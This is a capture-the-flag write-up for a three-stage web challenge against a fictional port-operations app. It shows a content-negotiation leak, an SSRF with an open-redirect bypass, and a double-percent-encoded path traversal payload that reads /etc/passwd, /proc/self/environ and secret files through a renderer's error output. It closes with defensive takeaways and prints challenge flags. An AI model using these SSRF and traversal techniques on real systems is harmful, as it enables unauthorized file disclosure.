# Port Authority

| | |
|---|---|
| **Category** | Web |
| **Points** | 175 |
| **Author** | Anonymous |
| **Solves** | 35 |
| **Files** | `label_renderer`, `sample_manifest.json` |

> Chain: **Container Says This Side Up** (50 pts) → **Berth Control** (230 pts) → **Port Authority** (175 pts)
>
> Flag: `CYBLTZ2026{7h3_r3nD3r3r_7ru573d_7h3_pr0f1l3}`

## Overview

Three challenges form a single dependency chain built around a fictional port-operations
system (Afterlight / Port Operations). Each stage hands you the credential needed to unlock
the next:

1. **Container Says This Side Up** — a public manifest preview hides a sealed field behind
   content negotiation. Recovering it yields a `booking_ref`.
2. **Berth Control** — an SSRF/import endpoint accepts that `booking_ref` and returns a
   `release_record`.
3. **Port Authority** — the final target. It needs the `release_record` to stage a manifest,
   which is then imported by an internal job API and rendered by a vulnerable native binary
   (`label_renderer`) that can be coerced into leaking arbitrary files on the host.

---

## Stage 1 — Container Says This Side Up (50 pts)

**Prompt:** "A public manifest preview omits a sealed field. Release the container to
recover its record."

The "Container desk" page serves a manifest preview for container `AF-2602`
(`lighting spares` / `Meridian Quay`), with a note that *"other representations are
available for system integrations."* That's a content-negotiation hint: the default
HTML/JSON view redacts the real booking reference, but requesting an alternate
representation (e.g. a different `Accept` header / extension aimed at machine
consumers) returns the unredacted manifest, including:

```
"_sealed_booking_ref": "BK-2602-1CBE3B57FA44037077A75FEF"
```

Submitting that value into the page's **Release this container** form (booking
reference field) solves the challenge and also hands you the credential needed for
Stage 2.

---

## Stage 2 — Berth Control (230 pts)

**Setup:** A berth desk imports manifests by URL (`GET /import?src=...`), restricted
to an allowlisted host (`public.afterlight.local:8080`). The internal berth record
(`/berths/<number>`) is not directly exposed — it's only revealed once the import
request carries a **sealed booking reference** via the `X-Booking-Ref` header
(the value recovered in Stage 1).

The operator memo also references a training redirector
(`http://public.afterlight.local:8080/redirect?next=...`), consistent with an
open-redirect-based SSRF bypass of the host allowlist — the classic "approved host
that just forwards you somewhere else" pattern.

Feeding the Stage 1 booking reference through the import flow returns the real
**Berth release record**:

```
BR42-A13428DC7E9AAD8EFBFAB5D1
```

That record is a "Claim a release record" value on the Berth Control app, and it's
also exactly what Port Authority's manifest-staging form asks for.

---

## Stage 3 — Port Authority (175 pts)

**Prompt:** "The port's label pipeline sometimes assigns cargo to the wrong vessel.
Bring the Berth Control release record and recover the final clearance token."

### The app

`Port Authority Label Desk` exposes three features:

- **Remote Label Preview** — `GET /preview?url=<url>`, a straightforward SSRF: it
  fetches arbitrary URLs server-side, including internal-only hosts.
- **Stage Manifest Draft** — `POST /manifest/preview`, takes a `release_record` and
  a `manifest` (JSON: `cargo`, `destination`, `profile`). Requires a real Berth
  Control release record. On success it stores the manifest publicly and returns an
  `internal_manifest_url` (e.g. `http://web:8080/uploads/<id>.json`).
- **Operator Notes** — mentions a migration to a new "cargo job API."

### Reversing `label_renderer`

A copy of the renderer binary used by the internal pipeline was provided.
Usage: `label_renderer <profile> <cargo> <destination> <output>`.

Key findings from static analysis:

- `argv[1]` (`profile`) is `%XX`-URL-decoded into a buffer.
- The file path is built with `snprintf("%s%s", "/opt/port-authority/profiles/", decoded_profile)`.
- The code then does `strncmp(path, "/opt/port-authority/profiles/", 29)` and errors
  `"profile escaped trusted root"` on mismatch — but since the root string is always
  prepended first, **this check always succeeds**. It's dead code. `../` sequences
  in the decoded profile traverse right past it once the OS resolves the path on
  `fopen()`.
- The opened file's first 17 bytes must equal the magic string `PORTAUTH-LABEL-v1`.
  On mismatch, the renderer doesn't fail quietly — it sanitizes non-printable bytes
  to `.` and prints:
  ```
  renderer: template parse error in <path>
  renderer: first bytes: <up to ~0x300 bytes of file content>
  ```
  This turns the renderer into an **arbitrary-file-read oracle** for any file that
  doesn't start with the magic header.
- A decoded `%00` triggers a separate "invalid legacy profile alias" error (so NUL
  truncation isn't usable), but plain `../` traversal works fine.

### Discovering the internal API

The `Remote Label Preview` SSRF reaches the internal cargo job API directly:

```
GET /preview?url=http://api:9000/v1/info
```

Response:

```json
{
  "links": {
    "health": "/health",
    "job_events": "/v1/jobs/<job_id>/events?trace=<job-trace>",
    "job_status": "/v1/jobs/<job_id>",
    "legacy_manifest_import": "/v0/import?src=<manifest-url> (retired)",
    "manifest_import": "/v1/import?src=<manifest-url>"
  },
  "notes": [
    "imports accept staged manifest resources by URL",
    "renderer diagnostics are keyed by job trace"
  ],
  "service": "port-authority-internal-api",
  "status": "manifest-imports-enabled",
  "version": "2026.06-migration"
}
```

### Building the exploit chain

1. **Stage a malicious manifest** with the real Berth release record and a path
   traversal payload in `profile`. A single layer of `../` (or single
   percent-encoding, `%2e%2e%2f`) is rejected by the import endpoint with
   `{"error":"profile failed canonical-name policy"}` — it decodes one layer before
   validating. **Double percent-encoding** (`%252e%252e%252f...`) slips past that
   check, because the validator only sees the once-decoded (still encoded) string,
   while the renderer binary decodes it a second time at execution:

   ```json
   {
     "cargo": "SIT-TRAINING-CONTAINER",
     "destination": "BRANI_GATE_04",
     "profile": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fflag"
   }
   ```

   `POST /manifest/preview` with the Berth release record (reusable across
   requests) returns:

   ```json
   {"manifest_id":"...", "internal_manifest_url":"http://web:8080/uploads/<id>.json", ...}
   ```

2. **Trigger the internal import via SSRF**, pointing the cargo job API's import
   endpoint at the staged manifest:

   ```
   GET /preview?url=http://api:9000/v1/import?src=http://web:8080/uploads/<id>.json
   ```

   Returns a queued job:

   ```json
   {"job_id":"<id>","status":"queued","status_url":"/v1/jobs/<id>","trace":"dock-...-..."}
   ```

3. **Pull the job's event trace**, also via SSRF, using the job id and trace
   together (both must be embedded inside the single `url=` parameter passed to
   `/preview` — the portal itself gates this with a `trace required` / 403 response
   otherwise, and traces appear to be short-lived, so step 2 → step 3 should be
   done back-to-back):

   ```
   GET /preview?url=http://api:9000/v1/jobs/<job_id>/events?trace=<trace>
   ```

   This returns the renderer's stdout/stderr for the job, including the leaked
   "first bytes" of whatever file the traversal opened.

### Finding the right file

With the pipeline confirmed (a traversal to `/etc/passwd` leaked the full file,
proving 4×`../` correctly reaches filesystem root), several guesses came back
"No such file or directory" (`/flag`, `/flag.txt`, `/app/flag`,
`/opt/port-authority/flag`, `/opt/flag`), and `/root/flag` /
`/root/flag.txt` existed but returned "Permission denied" (renderer runs
unprivileged).

The breakthrough was leaking the renderer process's own environment via
`/proc/self/environ`:

```
renderer: first bytes: CLEARANCE_MANIFEST=/run/secrets/clearance/8250bd6184d25e9b/manifest...
```

Traversing to that manifest revealed a **decoy** — a retired token path, plus the
real one:

```
PORT-AUTHORITY-CLEARANCE-MANIFEST-v2.status=active
.retired_token=PA-MANIFEST-TRAINING-TOKEN-NOT-FINAL
.retired_path=/run/secrets/clearance/8250bd6184d25e9b/token-retired
.final_path=/run/secrets/clearance/8250bd6184d25e9b/token-71c605353be68edd
.note=renderer diagnostics preserve the manifest path, not the cargo token.
```

Traversing one more time to that `final_path` finally leaked the flag:

```
renderer: first bytes: CYBLTZ2026{7h3_r3nD3r3r_7ru573d_7h3_pr0f1l3}
```

---

## Flag

```
CYBLTZ2026{7h3_r3nD3r3r_7ru573d_7h3_pr0f1l3}
```

("the renderer trusted the profile" — a fitting summary: the binary's own
path-escape check was always a no-op, and every layer built on top of it
(canonical-name policy, SSRF-only internal API, trace-gated diagnostics) still
ultimately trusted whatever path the profile field decoded to.)

## Takeaways

- A prefix check on a **concatenated** path (`root + user_input`) is not a
  traversal defense — it will always match the prefix regardless of `../`
  content, since the root is prepended by construction. Traversal defenses need
  to validate the *canonicalized/resolved* path, not the literal string.
- Validating decoded input once doesn't stop input that's decoded **twice**
  downstream — a canonical-name filter that strips one layer of percent-encoding
  can be bypassed by double-encoding if a later consumer decodes again.
- Verbose error/diagnostic paths (a renderer printing "first bytes" of a file it
  failed to parse) are a classic way an otherwise-contained path traversal turns
  into full arbitrary file read.
- Environment variables and alternate representations are both worth checking
  early — they often point directly at the real secret path instead of requiring
  blind directory guessing.
